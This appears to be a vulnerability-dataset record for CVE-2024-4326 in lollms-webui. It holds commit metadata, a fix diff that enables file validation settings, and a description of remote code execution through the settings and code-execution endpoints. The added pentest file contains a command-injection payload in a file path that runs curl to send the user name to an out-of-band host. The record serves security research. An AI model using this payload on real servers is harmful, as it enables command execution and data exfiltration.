{
  "cve_id": "CVE-2024-4326",
  "github_data": {
    "repository": "parisneo/lollms-webui",
    "fix_commit": "abb4c6d495a95a3ef5b114ffc57f85cd650b905e",
    "related_commits": [
      "abb4c6d495a95a3ef5b114ffc57f85cd650b905e",
      "abb4c6d495a95a3ef5b114ffc57f85cd650b905e"
    ],
    "patch_url": "https://github.com/parisneo/lollms-webui/commit/abb4c6d495a95a3ef5b114ffc57f85cd650b905e.patch",
    "fix_commit_details": {
      "sha": "abb4c6d495a95a3ef5b114ffc57f85cd650b905e",
      "commit_date": "2024-04-29T16:52:35Z",
      "author": {
        "login": "ParisNeo",
        "type": "User",
        "stats": {
          "total_commits": 2463,
          "average_weekly_commits": 26.20212765957447,
          "total_additions": 2276825,
          "total_deletions": 2311441,
          "weeks_active": 93
        }
      },
      "commit_message": {
        "title": "upgraded",
        "length": 8,
        "has_description": false,
        "references_issue": false
      },
      "stats": {
        "total": 54,
        "additions": 31,
        "deletions": 23
      },
      "files": [
        {
          "filename": "MotionCtrl",
          "status": "removed",
          "additions": 0,
          "deletions": 1,
          "patch": "@@ -1 +0,0 @@\n-Subproject commit d7bd9089d596b7ef178725d19cb144ee3ef468e8"
        },
        {
          "filename": "configs/config.yaml",
          "status": "modified",
          "additions": 17,
          "deletions": 17,
          "patch": "@@ -1,23 +1,23 @@\n # =================== Lord Of Large Language Multimodal Systems Configuration file =========================== \n-version: 83\n+version: 84\n binding_name: null\n model_name: null\n model_variant: null\n model_type: null\n \n-show_news_panel: True\n+show_news_panel: true\n \n # Security measures\n-turn_on_setting_update_validation: True\n-turn_on_code_execution: True\n-turn_on_code_validation: True\n-turn_on_open_file_validation: False\n-turn_on_send_file_validation: False\n+turn_on_setting_update_validation: true\n+turn_on_code_execution: true\n+turn_on_code_validation: true\n+turn_on_open_file_validation: true\n+turn_on_send_file_validation: true\n \n force_accept_remote_access: false\n \n # Server information\n-headless_server_mode: False\n+headless_server_mode: false\n allowed_origins: []\n \n # Host information\n@@ -57,7 +57,7 @@ use_user_informations_in_discussion: false\n discussion_db_name: default\n \n # Automatic updates\n-debug: False\n+debug: false\n debug_log_file_path: \"\"\n auto_update: true\n auto_sync_personalities: true\n@@ -110,10 +110,10 @@ petals_device: cuda\n enable_lollms_service: false\n lollms_base_url: http://localhost:1234\n lollms_access_keys : \"\" # set a list of keys separated by coma to restrict access\n-activate_lollms_server: True\n-activate_ollama_emulator: True\n-activate_openai_emulator: True\n-activate_mistralai_emulator: True\n+activate_lollms_server: true\n+activate_ollama_emulator: true\n+activate_openai_emulator: true\n+activate_mistralai_emulator: true\n \n # elastic search service\n elastic_search_service: false\n@@ -150,7 +150,7 @@ data_vectorization_method: \"tfidf_vectorizer\" #\"model_embedding\" or \"tfidf_vecto\n data_visualization_method: \"PCA\" #\"PCA\" or \"TSNE\"\n data_vectorization_sentense_transformer_model: \"all-MiniLM-L6-v2\" # you can use another model by setting its name here or its path\n \n-data_vectorization_save_db: False # For each new session, new files\n+data_vectorization_save_db: false # For each new session, new files\n data_vectorization_chunk_size: 512 # chunk size\n data_vectorization_overlap_size: 128 # overlap between chunks size\n data_vectorization_nb_chunks: 2 # number of chunks to use\n@@ -165,16 +165,16 @@ internet_vectorization_chunk_size: 512 # chunk size\n internet_vectorization_overlap_size: 128 # overlap between chunks size\n internet_vectorization_nb_chunks: 2 # number of chunks to use\n internet_nb_search_pages: 3 # number of pages to select\n-internet_quick_search: False # If active the search engine will not load and read the webpages\n-internet_activate_search_decision: False # If active the ai decides by itself if it needs to do search\n+internet_quick_search: false # If active the search engine will not load and read the webpages\n+internet_activate_search_decision: false # If active the ai decides by itself if it needs to do search\n # Helpers\n pdf_latex_path: null\n \n # boosting information\n positive_boost: null\n negative_boost: null\n force_output_language_to_be: null\n-fun_mode: False\n+fun_mode: false\n \n \n # webui configurations"
        },
        {
          "filename": "endpoints/lollms_advanced.py",
          "status": "modified",
          "additions": 3,
          "deletions": 4,
          "patch": "@@ -212,11 +212,10 @@ async def open_file(file_path: FilePath):\n             return {\"status\":False,\"error\":\"User refused the opeining file!\"}\n \n     forbid_remote_access(lollmsElfServer)\n+    # Validate the 'path' parameter\n+    path = sanitize_path(file_path.path, allow_absolute_path=True)\n \n-    try:\n-        # Validate the 'path' parameter\n-        path = sanitize_path(file_path.path, allow_absolute_path=True)\n-        \n+    try:        \n         if Path(path).exists():\n             # Use subprocess.Popen to safely open the file\n             ASCIIColors.yellow(f\"Starting file : {path}\")"
        },
        {
          "filename": "lollms_core",
          "status": "modified",
          "additions": 1,
          "deletions": 1,
          "patch": "@@ -1 +1 @@\n-Subproject commit 95ad36eeffc6a6be3e3f35ed35a384d768f0ecf6\n+Subproject commit 227df34a42f6cfb73184e50f7a8757d1d67ff60c"
        },
        {
          "filename": "tests/pentests/tests.http",
          "status": "added",
          "additions": 10,
          "deletions": 0,
          "patch": "@@ -0,0 +1,10 @@\n+############################################\n+### Load Discussion by ID\n+############################################\n+POST http://localhost:9600/open_file\n+Content-Type: application/json\n+\n+{\n+    \"client_id\":\"5tp76HAcZWvKry3VAAAD\",\n+    \"path\":\"/home/kali/huntr/discussion_databases/default/1/text_data/hai`curl $(whoami).9dnvxt2tdxl52lmfk6ejf0c6qxwpkf84.oastify.com`.txt\"\n+}\n\\ No newline at end of file"
        }
      ],
      "file_patterns": {
        "security_files": 0,
        "config_files": 1,
        "dependency_files": 0,
        "test_files": 1,
        "unique_directories": 4,
        "max_directory_depth": 2
      },
      "context": {
        "surrounding_commits": [
          {
            "sha": "074fbb5988845100e16e33abe200c6fb0906ee49",
            "date": "2025-01-14T17:11:50Z",
            "author_login": "ParisNeo"
          },
          {
            "sha": "15b0e5ee7d3fdcec02e74e6ffceb09ddc44b7264",
            "date": "2025-01-14T17:11:41Z",
            "author_login": "ParisNeo"
          },
          {
            "sha": "78b7303da280e81d7891d022430c9e7019036409",
            "date": "2025-01-14T08:22:08Z",
            "author_login": "ParisNeo"
          },
          {
            "sha": "858e69c34a9f91c02d64f4736c2c61032a930ef5",
            "date": "2025-01-14T07:56:40Z",
            "author_login": "ParisNeo"
          },
          {
            "sha": "953879e8b018a8602bd142844c1d7f008e8ab01c",
            "date": "2025-01-13T22:54:09Z",
            "author_login": "ParisNeo"
          }
        ]
      }
    }
  },
  "vulnerability_details": {
    "cvss_score": null,
    "cvss_vector": null,
    "cwe_id": "CWE-15",
    "description": "A vulnerability in parisneo/lollms-webui versions up to 9.3 allows remote attackers to execute arbitrary code. The vulnerability stems from insufficient protection of the `/apply_settings` and `/execute_code` endpoints. Attackers can bypass protections by setting the host to localhost, enabling code execution, and disabling code validation through the `/apply_settings` endpoint. Subsequently, arbitrary commands can be executed remotely via the `/execute_code` endpoint, exploiting the delay in settings enforcement. This issue was addressed in version 9.5.",
    "attack_vector": null,
    "attack_complexity": null
  },
  "temporal_data": {
    "published_date": "2024-05-16T09:15:16.887",
    "last_modified": "2024-11-21T09:42:37.887",
    "fix_date": "2024-04-29T16:52:35Z"
  },
  "references": [
    {
      "url": "https://github.com/parisneo/lollms-webui/commit/abb4c6d495a95a3ef5b114ffc57f85cd650b905e",
      "source": "security@huntr.dev",
      "tags": []
    },
    {
      "url": "https://huntr.com/bounties/2ab9f03d-0538-4317-be21-0748a079cbdd",
      "source": "security@huntr.dev",
      "tags": []
    },
    {
      "url": "https://github.com/parisneo/lollms-webui/commit/abb4c6d495a95a3ef5b114ffc57f85cd650b905e",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://huntr.com/bounties/2ab9f03d-0538-4317-be21-0748a079cbdd",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    }
  ],
  "collection_metadata": {
    "collected_at": "2025-01-11T23:08:24.245436",
    "processing_status": "raw"
  },
  "repository_context": {
    "name": "lollms-webui",
    "owner": "parisneo",
    "created_at": "2023-04-06T16:38:00Z",
    "updated_at": "2025-01-14T10:08:17Z",
    "pushed_at": "2025-01-14T08:22:08Z",
    "size": 154737,
    "stars": 4437,
    "forks": 557,
    "open_issues": 162,
    "watchers": 4437,
    "has_security_policy": false,
    "default_branch": "main",
    "protected_branches": [
      "main"
    ],
    "languages": {
      "CSS": 2202947,
      "Vue": 1151251,
      "Python": 353630,
      "JavaScript": 179164,
      "Shell": 41865,
      "Batchfile": 30713,
      "Inno Setup": 27460,
      "HTML": 22305,
      "Jupyter Notebook": 3623,
      "Dockerfile": 1246
    },
    "commit_activity": {
      "total_commits_last_year": 0,
      "avg_commits_per_week": 0,
      "days_active_last_year": 0
    },
    "security_features": {
      "has_security_policy": false,
      "has_protected_branches": true,
      "has_wiki": true,
      "has_issues": true,
      "allow_forking": true,
      "is_template": false,
      "license": "apache-2.0"
    },
    "collected_at": "2025-01-14T14:52:33.568829"
  }
}